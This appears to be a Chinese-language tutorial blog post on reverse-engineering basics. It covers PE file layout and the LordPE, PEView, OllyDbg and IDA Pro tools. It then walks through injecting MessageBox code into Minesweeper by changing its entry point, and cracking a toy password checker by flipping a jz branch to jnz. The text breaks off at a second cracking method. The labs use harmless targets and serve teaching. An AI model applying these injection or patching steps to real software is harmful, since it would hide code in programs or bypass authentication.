placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/b13105cc7240aea8122068dd1d276f77.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>由于文件数据的存放单位与内存数据存放单位不同而造成一些差异：</p><ul><li>PE文件中的数据按照<strong>磁盘数据标准</strong>存放，以<strong>0x200字节</strong>为基本单位进行组织。当一个数据节（section）不足0x200字节时，不足的地方将被0x00填充：当一个数据节超过0x200字节时，下一个0x200块将分配给这个节使用。因此PE数据节的大小永远是0x200的整数倍。</li><li>当代码装入内存后，将按照<strong>内存数据标准</strong>存放，并以<strong>0x1000字节</strong>为基本单位进行组织。类似的，不足将被补全，若超出将分配下一个0x1000为其所用。因此，内存中的节总是0x1000的整数倍。</li></ul><h2 id="LordPE"><a href="#LordPE" class="headerlink" title="LordPE"></a>LordPE</h2><p>LordPE是一款功能强大的PE文件分析、修改、脱壳软件。LordPE是<strong>查看PE格式文件信息</strong>的首选工具，并且可以修改相关信息。</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/b74441e0db7cd9daf78ce6ea841da82b.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/b74441e0db7cd9daf78ce6ea841da82b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/5fcc10dbb7e831dc539bcda0ded25f07.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/5fcc10dbb7e831dc539bcda0ded25f07.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/d265ee3d0c33b000ba36bdbac1f7ef99.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/d265ee3d0c33b000ba36bdbac1f7ef99.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><u>VOffset是RVA（相对虚拟地址），ROffset是文件偏移</u>。也就是，在系统进程中，代码（.text节）将被加载到0x400000+0x11000=0x411000的虚拟地址中（装载基址+RVA）。而在文件中，可以使用二进制文件打开，看到对应的代码在0x1000位置处。</p><h3 id="查看导入表信息"><a href="#查看导入表信息" class="headerlink" title="查看导入表信息"></a>查看导入表信息</h3><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/3fe03270dca9179b0a3b7cca6d1d47d9.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/3fe03270dca9179b0a3b7cca6d1d47d9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>导入表</strong>在文件里的偏移地址ROffset为0x24000，RVA是0x25000。打开目录表可以看到，可以看到输入表的RVA确实是0x25000。点左侧按钮L可以查看具体输入表里的内容。</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/18ce026a0bbd64915caac1890f4e238d.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/18ce026a0bbd64915caac1890f4e238d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="IAT表信息"><a href="#IAT表信息" class="headerlink" title="IAT表信息"></a>IAT表信息</h3><p>IAT(Import Address Table:输入函数地址表)</p><p>每个API函数在对应的进程空间中都有其相应的入口地址。众所周知，操作系统动态库版本的更新，其包含的API函数入口地址通常也会改变。由于<strong>入口地址的不确定性</strong>，程序在不同的电脑上很有可能会出错，为了<strong>解决程序的兼容问题</strong>，操作系统就必须提供一些措施来确保程序可以在其他版本的Windows操作系统，以及DLL版本下也能正常运行。这时IAT表就应运而生了。</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/e9c3da364ac44a7ce8370f92317ab4bc.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/e9c3da364ac44a7ce8370f92317ab4bc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>基于导入表可以定位IAT的具体信息，相关工具可以帮助直接查看IAT表的相关内容。</p><h2 id="PEView"><a href="#PEView" class="headerlink" title="PEView"></a>PEView</h2><p>直观显示PE文件内容</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/baa7a415ac91b7bfab3fddbd96c17501.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/baa7a415ac91b7bfab3fddbd96c17501.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><hr><h1 id="调试分析工具"><a href="#调试分析工具" class="headerlink" title="调试分析工具"></a>调试分析工具</h1><h2 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h2><p>是一种具有可视化界面的 32 位汇编—分析调试器，适合<strong>动态调试</strong>。 OllyDBG版的发布版本是个ZIP 压缩包，解压就可以使用了。</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/9429797b5f1e72bd680c512b816e4339.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/9429797b5f1e72bd680c512b816e4339.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="基本调试方法"><a href="#基本调试方法" class="headerlink" title="基本调试方法"></a>基本调试方法</h3><p>OllyDBG 有两种方式来载入程序进行调试</p><ul><li>一种是点击菜单文件，打开(快捷键是F3)来打开可执行文件进行调试</li><li>另一种是点击菜单文件，附加到一个<strong>己运行的进程上</strong>进行调试，要附加的程序必须己运行。</li></ul><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/9c3288b4d3e996ae24cf682fd4a2b542.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/9c3288b4d3e996ae24cf682fd4a2b542.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><ul><li>F2设置断点。</li><li>F7单步步入。功能同单步步过(F8)类似，区别是遇到 CALL 等子程序时会进入其中，进入后首先会停留在子程序的第一条指令上。</li><li>F8单步步过。执行一条指令，遇到 CALL 等子程序不进入其代码。</li><li>F4运行到选定位置。</li><li>F9运行</li><li>CTR+F9执行到返回。此命令在<strong>执行到一个ret(返回指令)指令时暂停</strong>，常用于<u>从系统领空返回到我们调试的程序领空</u>。</li><li>ALT+F9执行到用户代码。可用于<u>从系统领空快速返回到我们调试的程序领空</u>。</li></ul><h3 id="跟踪"><a href="#跟踪" class="headerlink" title="跟踪"></a>跟踪</h3><p>使用调试功能时通常会碰到在断点处无法定位入口的情况，即无法确定前序执行指令，通过Trace（跟踪）功能可以记录调试过程中执行的指令，用于分析前序执行指令。Trace记录可选择是否记录寄存器的值。</p><img src="1f99a9e631a0f7e89b20c1b4db94442f.png" class="lazyload placeholder" data-srcset="1f99a9e631a0f7e89b20c1b4db94442f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="" style="zoom:50%;" /><h2 id="IDA-PRO"><a href="#IDA-PRO" class="headerlink" title="IDA PRO"></a>IDA PRO</h2><p>简称IDA（Interactive Disassembler），是一个世界顶级的交互式反汇编工具，是<strong>逆向分析</strong>的主流工具。</p><p>IDA使用File菜单中的Open选项，可以打开一个计划逆向分析的<strong>可执行文件</strong>，打开的过程是需要耗费一些时间的。IDA会对可执行文件进行分析。一旦打开成功，会提示你是否进入Proximity view。通常都会点Yes，按默认选项进入。</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/1a8e519a2d0cc0318b776a724586ba34.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/1a8e519a2d0cc0318b776a724586ba34.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="反汇编窗口"><a href="#反汇编窗口" class="headerlink" title="反汇编窗口"></a>反汇编窗口</h3><p>也叫IDA-View窗口，是<strong>操作和分析二进制文件</strong>的主要工具。<br>反汇编窗口有三种显示格式：</p><ul><li>面向文本的列表视图(Text view)</li><li>基于图形的视图(Graphic View)</li><li>优化视图(Proximity view)将显示函数及其调用关系</li></ul><p><strong>视图间可以切换</strong>：在上图的Proximity view视图中，点选一个块，比如_main函数块，在其上点右键，可以看到Text view和Graph view等选项。通过右键可以实现不同视图的切换。</p><p><strong>图形视图</strong>：<u>将一个函数分解为许多基本块</u>，类似程序流程图类似，生动的显示该函数由一个块到另一个块的控制流程。<br>如下图所示的_main函数的图形视图：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/2f7d60675f497a32f4d6d6424782eb2d.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/2f7d60675f497a32f4d6d6424782eb2d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>文本视图</strong>：文本视图则呈现一个程序的完整反汇编代码清单（而在图形模式下一次只能显示一个函数），用户只有通过这个窗口才能查看一个二进制文件的数据部分。如下图所示的文本视图：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/df10f8fbf8d6278d7cfd3c84a42e7af8.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/df10f8fbf8d6278d7cfd3c84a42e7af8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>通常虚拟地址以<code>[区域名称]：[虚拟地址]</code>这种格式显示，如.txt:0040110C0。</p><blockquote><p>实线箭头表示非条件跳转，虚线箭头则表示条件跳转。如果一个跳转将<strong>控制权</strong>交给程序中的某个地址，这时会使用<strong>粗线</strong>，出现这类逆向流程，通常表示程序中存在循环。</p></blockquote><h3 id="其它窗口"><a href="#其它窗口" class="headerlink" title="其它窗口"></a>其它窗口</h3><p>通过菜单Views，Open subviews可以打开更多的窗口。</p><p><strong>Names窗口</strong>：列举二进制文件的所有全局名称。名称是指对一个程序虚拟地址的符号描述。 Names窗口显示的名称采用了颜色和字母编码，其编码方案如下：</p><ul><li>F常规函数</li><li>A字符串数据</li><li>L库函数</li><li>I导入的名称，通常为共享库导入的函数名称</li><li>D数据，已命名数据的位置通常表示全局变量</li></ul><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/caa262892976bebac86b7e23a6872afe.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/caa262892976bebac86b7e23a6872afe.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>Strings窗口</strong>：显示从二进制文件中提取出的字符串，以及每个字符串所在的地址。与双击Names窗口中的名称得到的结果类似，双击Strings窗口中的任何字符串，反汇编窗口将跳转到该字符串所在的地址。将Strings窗口与交叉引用结合，可以迅速定义感兴趣的字符串，并追踪到程序中任何引用该字符串的位置。</p><p><strong>Function name窗口</strong>：该窗口显示所有的函数。点击函数名称，可以快速导航到反汇编视图中的该函数区域。该窗口中的条目如下：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/af182d08303b7952cf6e6143ae826ff2.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/af182d08303b7952cf6e6143ae826ff2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>这一行信息指出：用户可以在二进制文件中虚拟地址为00401040的.text部分中找到_main函数，该函数长度为0x50字节。</p><p><strong>Function call窗口</strong>：函数调用（Function call）窗口将显示所有函数的调用关系。如下图：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/d3ced7a4d25ad57310c466f4b3b8d3ef.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/d3ced7a4d25ad57310c466f4b3b8d3ef.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>反编译</strong>：新版本的IDA增加了反编译功能，加强了分析能力。<br>在IDA View窗口下制定汇编代码，按快捷键F5，IDA会将当前所在位置的汇编代码编译成C/C++形式的代码，并在Pseudocode窗口中显示，如下图所示。</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/2731af7ffa7327966e03cfe00be0ae26.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/2731af7ffa7327966e03cfe00be0ae26.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><hr><h1 id="PE文件代码注入示例"><a href="#PE文件代码注入示例" class="headerlink" title="PE文件代码注入示例"></a>PE文件代码注入示例</h1><h2 id="演示内容及实验环境"><a href="#演示内容及实验环境" class="headerlink" title="演示内容及实验环境"></a>演示内容及实验环境</h2><p><strong>利用PE文件输入表API实现代码注入</strong>：让目标程序运行之前，先运行我们注入的代码，注入的代码将运行PE文件输入表里包含的API。</p><p>目标PE文件为Windows XP下的扫雷程序，使用的工具包括OllyDBG和LordPE。</p><p>扫雷游戏程序位置：在Windows下找到附件里的扫雷游戏，右键属性可以看到具体文件的位置，即C:\WINDOWS\system32\winmine.exe。</p><h3 id="用OllyDBG打开扫雷程序"><a href="#用OllyDBG打开扫雷程序" class="headerlink" title="用OllyDBG打开扫雷程序"></a>用OllyDBG打开扫雷程序</h3><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/48ea5e2f8ed501e9e4e16c59bdde8403.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/48ea5e2f8ed501e9e4e16c59bdde8403.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>程序会停下来，自动停下来的这一行代码位置就是<strong>程序入口点</strong>。可以通过LordPE文件来查看，得知<u>程序入口点的RVA是0x00003E21</u>，同时也可以看到装载基址是0x01000000（扫雷程序是C++语言编写）；也可以通过右侧寄存器<u>EIP的值0x01003E21(VA)</u>可以观察到注释信息里，提示是ModuleEntryPoint。<br>反汇编区域继续往下翻页，可以看到相关的导入表动态链接库及其相关函数的信息。</p><h3 id="在空白代码区编写要注入的代码"><a href="#在空白代码区编写要注入的代码" class="headerlink" title="在空白代码区编写要注入的代码"></a>在空白代码区编写要注入的代码</h3><p>在代码区可以找到大量的空白代码区域，如果我们往这里头植入代码，<strong>直接修改PE文件相关跳转地址（入口点或特定函数的IAT的跳转地址）</strong>，就可以实现相关的植入代码的执行。</p><p>本实验：演示让扫雷程序运行之前，先运行我们注入的代码，注入的代码将调用PE文件输入表里包含的<strong>MessageBox函数</strong>，弹出对话框，显示相关信息。</p><h2 id="编辑和注入代码"><a href="#编辑和注入代码" class="headerlink" title="编辑和注入代码"></a>编辑和注入代码</h2><h3 id="Message函数"><a href="#Message函数" class="headerlink" title="Message函数"></a>Message函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MessageBox</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">    HWND hWnd,          <span class="comment">// handle to owner window</span></span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpText,        <span class="comment">// text in message box</span></span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCaption,     <span class="comment">// message box title</span></span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">    UINT uType            <span class="comment">// message box style</span></span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>hWnd：消息框所属窗口的<strong>句柄</strong>，如果为NULL，消息框则不属于任何窗口。</li><li>lpText：字符串指针，所指字符串会在<strong>消息框中显示</strong>。</li><li>lpCaption：字符串指针，所指字符串将成为消息框的<strong>标题</strong>。</li><li>uType：消息框的<strong>风格</strong>（单按钮、多按钮等），NULL代表默认风格。</li></ul><p><code>系统中并不存在真正的MessageBox函数，调用最终都将由系统按照参数中的字符串的类型选择“A”类函数（ASCII）或者“W”类函数（UNICODE）调用，我们使用MessageBoxA.</code></p><h3 id="构造相关字符串"><a href="#构造相关字符串" class="headerlink" title="构造相关字符串"></a>构造相关字符串</h3><p><strong>计划注入的代码功能为</strong>：弹出对话框，显示“You are Injected!”。</p><p>在代码空白区域每一行位置，点鼠标右键，选择  编辑-&gt;二进制编辑。</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/52f9419e787149ad34f4b013b3ee5dc7.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/52f9419e787149ad34f4b013b3ee5dc7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>在弹出的编辑界面里，输入ASCII码“PE Inject”，<u>将“保持代码空间大小”去掉选中状态</u>，状态如下：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/ae6a0db57e761c2bf51a9a326a1baed6.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/ae6a0db57e761c2bf51a9a326a1baed6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/245114598208cebd3e589f86f952794d.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/245114598208cebd3e589f86f952794d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>按快捷键<strong>CTRL+A</strong>（分析），显示为ASCII码。再加入另一条语句“You are Injected!” 。</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/e2d55a69e0e3b7b96491799a534d670b.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/e2d55a69e0e3b7b96491799a534d670b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>上面的每个语句后面都留了一行00。因为，字符串后面是需要结束符0x00的。</p><h3 id="构造函数调用的代码"><a href="#构造函数调用的代码" class="headerlink" title="构造函数调用的代码"></a>构造函数调用的代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">push <span class="number">0</span>（默认风格）; </span><br><span class="line">push <span class="number">0x01004AA7</span>（标题字符串地址）; </span><br><span class="line">push <span class="number">0x01004A9C</span>（内容字符串地址）; </span><br><span class="line">push <span class="number">0</span>（窗口归属）; </span><br><span class="line">call MessageBoxA</span><br><span class="line"></span><br><span class="line"><span class="comment">//参数压入栈中的顺序是从右向左</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意，直接双击要修改的当前行，就进入修改汇编代码的状态，如下：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/b3b8849e41cc9759a204f6d7de782ce8.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/b3b8849e41cc9759a204f6d7de782ce8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>我们输入的汇编指令call MessageBoxA之所以后面能成功运行，也是因为<strong>PE文件的输入表里已经有这个函数的入口地址了</strong>。以上代码完成输入后，结果如下：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/0163343850179558951936f37384b979.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/0163343850179558951936f37384b979.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="挂接代码及完成跳转"><a href="#挂接代码及完成跳转" class="headerlink" title="挂接代码及完成跳转"></a>挂接代码及完成跳转</h2><h3 id="挂接代码"><a href="#挂接代码" class="headerlink" title="挂接代码"></a>挂接代码</h3><p>我们首先继续输入一条指令<code>jmp 0x01003E21</code>。这句话意思是我们运行完我们注入的弹出对话框之后，会<strong>跳转到我们原来的这个PE文件的入口点</strong>，继续运行。结果如下图：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/7c7358e50cc162fe8a54e358642f32a4.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/7c7358e50cc162fe8a54e358642f32a4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="保存修改"><a href="#保存修改" class="headerlink" title="保存修改"></a>保存修改</h3><p>上述修改是在原始文件副本里修改的，如果要保存修改，需要：</p><ol><li>点鼠标右键，选择“编辑-&gt;复制所有修改到可执行文件”，会弹出一个对话框，包含所有修改后的代码；</li><li>在这个对话框空白处继续点右键“编辑-&gt;保存文件”，弹出保存文件的界面，在这个里面选择保存类型为“可执行文件或DLL”，输入新的文件名，比如winmine1.exe，点保存即可。</li></ol><p>到此，文件修改完毕，但是如果直接运行这个扫雷程序，并没有发生任何变化。** 因为，我们只是编辑了一段代码，只有这些代码被运行了才算真正被注入。**</p><h3 id="修改程序入口点完成跳转"><a href="#修改程序入口点完成跳转" class="headerlink" title="修改程序入口点完成跳转"></a>修改程序入口点完成跳转</h3><p>利用LordPE文件，我们<strong>更改一下程序入口点</strong>，为我们的程序的起始位置，即我们编辑的代码段的第一个push 0的位置，地址为0x01004ABA，因为只需要更改RVA，就修改为0x00004ABA即可，如下图：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/e249d0966d393b7c420096f3a50af5bb.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/e249d0966d393b7c420096f3a50af5bb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>保存后运行，可以看到弹出右侧对话框，之后出现扫雷程序。</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/7fcee0bf76690508f52673bec957744a.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/7fcee0bf76690508f52673bec957744a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><hr><h1 id="软件破解示例"><a href="#软件破解示例" class="headerlink" title="软件破解示例"></a>软件破解示例</h1><p>本节将对一个简单的密码验证程序，使用OllyDBG进行破解。具体程序如下：·</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> password <span class="string">&quot;12345678&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">verifyPwd</span><span class="params">(<span class="type">char</span> * pwd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> flag;</span><br><span class="line">    flag=<span class="built_in">strcmp</span>(password, pwd);</span><br><span class="line">    <span class="keyword">return</span> flag0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">bool</span> bFlag;</span><br><span class="line">    <span class="type">char</span> pwd[<span class="number">1024</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input your password:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,pwd);</span><br><span class="line">        bFlag=<span class="built_in">verifyPwd</span>(pwd);</span><br><span class="line">        <span class="keyword">if</span> (bFlag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;passed\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;wrong password, please input again:\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>破解对象是该程序生成的<strong>Debug模式的exe程序</strong>。<br>对得到的exe程序（假定不知道上面的源代码），有多种方式实现破解:</p><ul><li>使用OllyDBG<blockquote><p>通过运行程序，观察关键信息，通过对关键信息定位，来得到关键分支语句，通过<strong>对该分支语句进行修改</strong>，达到破解的目的;</p></blockquote></li><li>另一种方式<blockquote><p>可以通过IDA Pro来观察代码结构，确定函数入口地址，对<strong>函数体返回值</strong>进行更改。(给出的程序实例中使用的貌似还是OllyDBG)</p></blockquote></li></ul><p>运行程序，输入一个密码，发现运行结果如下：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/ffbf1f7aa8d349d4166cf50396f932bf.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/ffbf1f7aa8d349d4166cf50396f932bf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="使用OllyDBG破解"><a href="#使用OllyDBG破解" class="headerlink" title="使用OllyDBG破解"></a>使用OllyDBG破解</h2><p>在OllyDBG中，为了尽快定位到分支语句处，在<strong>反汇编窗口</strong>，点右键，选择“<strong>查找→所有引用的字符串</strong>”功能：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/eb434048fb7ed0d6d3e8906e81392935.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/eb434048fb7ed0d6d3e8906e81392935.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>然后，使用快捷键，Ctrl+F打开搜索窗口，输入<u>wrong</u>，点确定后，将定位出错信息的哪一行代码：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/e39a7a3421fd76faec904bb89a8a46fe.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/e39a7a3421fd76faec904bb89a8a46fe.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>双击这一行代码，就会定位反汇编中的相应代码处：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/4d279f261e402648536939a4e65469cb.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/4d279f261e402648536939a4e65469cb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="破解方式一：修改分支语句"><a href="#破解方式一：修改分支语句" class="headerlink" title="破解方式一：修改分支语句"></a>破解方式一：修改分支语句</h3><p>观察反汇编语言，可知核心分支判断在于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Test eax,eax</span><br><span class="line"></span><br><span class="line">Jz short 0041364b</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果jz条件成立，则跳转到0041364b处，即显示错误密码分支语句中。如果将jz该指令改为jnz，则程序截然相反。输入了错误密码，将进入验证成功的分支中。<br>双击jz密码一行，对其进行修改：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/161d9db42b0676a65e76958f8891f45f.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/161d9db42b0676a65e76958f8891f45f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>注意：<br>此时并没有真正修改二进制文件中的有关代码，如果想要修改二进制文件中的代码，需要在反汇编窗口，点右键，选择“编辑-&gt;复制当前修改到可执行文件”。保存后的可执行文件，将是破解后的文件。</p></blockquote><h3 id="破解方式二：修改函数返回值"><a href="#破解方式二：修改函数返回值" class="headerlink" 